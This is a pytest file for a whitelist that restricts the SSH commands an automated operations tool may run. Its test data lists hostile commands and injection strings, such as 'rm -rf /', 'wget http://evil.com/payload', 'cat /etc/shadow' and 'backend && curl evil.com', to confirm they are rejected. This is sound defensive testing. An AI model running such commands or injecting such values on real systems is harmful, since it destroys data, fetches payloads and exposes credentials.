"""
Tests for the whitelist enforcement layer. These are the most important
tests in Phase 2 — they verify that dangerous commands are rejected
BEFORE any SSH connection would ever be attempted, and that parameterized
commands can't be used to smuggle in arbitrary shell content.
"""
import pytest
from app.ssh_whitelist import (
    is_command_allowed,
    validate_container_name,
    validate_service_name,
    validate_tail_lines,
    build_docker_logs_command,
    build_docker_inspect_command,
    build_service_status_command,
    ValidationError,
)


# --- whitelist acceptance: every literal pattern must match itself ---

@pytest.mark.parametrize("command", [
    "docker ps",
    "docker ps -a",
    "df -h",
    "free -h",
    "docker stats --no-stream",
    "uptime",
])
def test_whitelist_accepts_exact_literal_commands(command):
    assert is_command_allowed(command) is True


def test_whitelist_accepts_valid_docker_logs():
    assert is_command_allowed("docker logs backend --tail 50") is True


def test_whitelist_accepts_valid_docker_inspect():
    assert is_command_allowed("docker inspect backend") is True


def test_whitelist_accepts_valid_systemctl_status():
    assert is_command_allowed("systemctl status nginx") is True


def test_whitelist_accepts_process_listing():
    assert is_command_allowed("ps aux --sort=-%cpu") is True


def test_whitelist_accepts_docker_formatted_status():
    assert is_command_allowed("docker ps -a --format '{{.Names}}|{{.Status}}|{{.State}}'") is True


def test_whitelist_rejects_old_broken_tab_format():
    """Regression: the old unquoted \\t version must NOT be in the whitelist
    anymore — it's a different, broken command string."""
    assert is_command_allowed("docker ps -a --format {{.Names}}\t{{.Status}}\t{{.State}}") is False


@pytest.mark.parametrize("command", [
    "kubectl get nodes",
    "kubectl get pods -A",
    "kubectl get deployments -A",
    "kubectl get services -A",
    "kubectl get events -A",
    "kubectl cluster-info",
])
def test_whitelist_accepts_k3s_readonly_commands(command):
    assert is_command_allowed(command) is True


@pytest.mark.parametrize("command", [
    "kubectl delete pod foo",
    "kubectl apply -f evil.yaml",
    "kubectl create deployment x",
    "kubectl patch node foo",
    "kubectl edit deployment foo",
    "kubectl rollout restart deployment foo",
    "kubectl scale deployment foo --replicas=0",
    "kubectl exec -it foo -- sh",
    "ps aux --sort=-%cpu | head -5",
    "ps aux --sort=-%cpu; rm -rf /",
])
def test_whitelist_rejects_k3s_and_process_write_or_injection_attempts(command):
    assert is_command_allowed(command) is False


# --- whitelist rejection: the explicit "never allow" list from the spec ---

@pytest.mark.parametrize("command", [
    "rm -rf /",
    "rm file.txt",
    "shutdown now",
    "reboot",
    "curl http://evil.com",
    "wget http://evil.com/payload",
    "chmod 777 /etc/passwd",
    "chown root:root /",
    "apt install malware",
    "apt-get update",
    "bash",
    "sh -c 'echo hi'",
    "python3 -c 'print(1)'",
    "pip install requests",
    "docker exec backend sh",
    "docker run -it ubuntu",
    "docker rm backend",
    "docker stop backend",
    # NOTE: docker restart and systemctl restart are now PHASE 5 allowed
    # actions — they are whitelisted for safe, approved remediation.
    "systemctl stop nginx",
    "systemctl disable nginx",
])
def test_whitelist_rejects_explicitly_forbidden_commands(command):
    assert is_command_allowed(command) is False


def test_whitelist_allows_phase5_restart_commands():
    """Phase 5: docker restart and systemctl restart are now safe, allowed actions."""
    assert is_command_allowed("docker restart backend") is True
    assert is_command_allowed("systemctl restart nginx") is True


def test_whitelist_rejects_unknown_commands_by_default():
    assert is_command_allowed("ls -la /root") is False
    assert is_command_allowed("cat /etc/shadow") is False
    assert is_command_allowed("") is False
    assert is_command_allowed(None) is False


def test_whitelist_rejects_command_injection_via_placeholder():
    # attempts to smuggle a second command through a parameterized slot
    assert is_command_allowed("docker logs backend; rm -rf / --tail 50") is False
    assert is_command_allowed("docker logs $(whoami) --tail 50") is False
    assert is_command_allowed("docker inspect backend && curl evil.com") is False
    assert is_command_allowed("systemctl status nginx; reboot") is False


def test_whitelist_rejects_close_but_not_exact_matches():
    # extra flags or reordering shouldn't slip through
    assert is_command_allowed("docker ps -a -a") is False
    assert is_command_allowed("docker  ps") is False  # double space
    assert is_command_allowed("Docker ps") is False  # case sensitivity
    assert is_command_allowed("uptime --pretty") is False


# --- parameter validation: container/service names ---

def test_validate_container_name_accepts_safe_names():
    assert validate_container_name("backend") == "backend"
    assert validate_container_name("dev_billing-backend.1") == "dev_billing-backend.1"


@pytest.mark.parametrize("bad_name", [
    "backend; rm -rf /",
    "backend && curl evil.com",
    "backend`whoami`",
    "backend$(whoami)",
    "backend | cat /etc/passwd",
    "../../etc/passwd",
    "backend with spaces",
    "",
    None,
    123,
])
def test_validate_container_name_rejects_unsafe_names(bad_name):
    with pytest.raises(ValidationError):
        validate_container_name(bad_name)


def test_validate_service_name_accepts_safe_names():
    assert validate_service_name("nginx") == "nginx"
    assert validate_service_name("postgresql.service") == "postgresql.service"


@pytest.mark.parametrize("bad_name", ["nginx; reboot", "nginx && rm -rf /", "", None])
def test_validate_service_name_rejects_unsafe_names(bad_name):
    with pytest.raises(ValidationError):
        validate_service_name(bad_name)


# --- parameter validation: tail line count ---

def test_validate_tail_lines_accepts_valid_numbers():
    assert validate_tail_lines(50) == 50
    assert validate_tail_lines("50") == 50  # model sometimes sends strings
    assert validate_tail_lines(1) == 1
    assert validate_tail_lines(1000) == 1000


@pytest.mark.parametrize("bad_value", [0, -5, 1001, "not-a-number", None, "; rm -rf /"])
def test_validate_tail_lines_rejects_invalid_values(bad_value):
    with pytest.raises(ValidationError):
        validate_tail_lines(bad_value)


# --- command builders produce exactly-whitelisted output ---

def test_build_docker_logs_command_produces_whitelisted_string():
    command = build_docker_logs_command("backend", 50)
    assert command == "docker logs backend --tail 50"
    assert is_command_allowed(command) is True


def test_build_docker_logs_command_rejects_injection_attempt():
    with pytest.raises(ValidationError):
        build_docker_logs_command("backend; rm -rf /", 50)


def test_build_docker_inspect_command_produces_whitelisted_string():
    command = build_docker_inspect_command("backend")
    assert command == "docker inspect backend"
    assert is_command_allowed(command) is True


def test_build_service_status_command_produces_whitelisted_string():
    command = build_service_status_command("nginx")
    assert command == "systemctl status nginx"
    assert is_command_allowed(command) is True


def test_build_service_status_command_rejects_injection_attempt():
    with pytest.raises(ValidationError):
        build_service_status_command("nginx && reboot")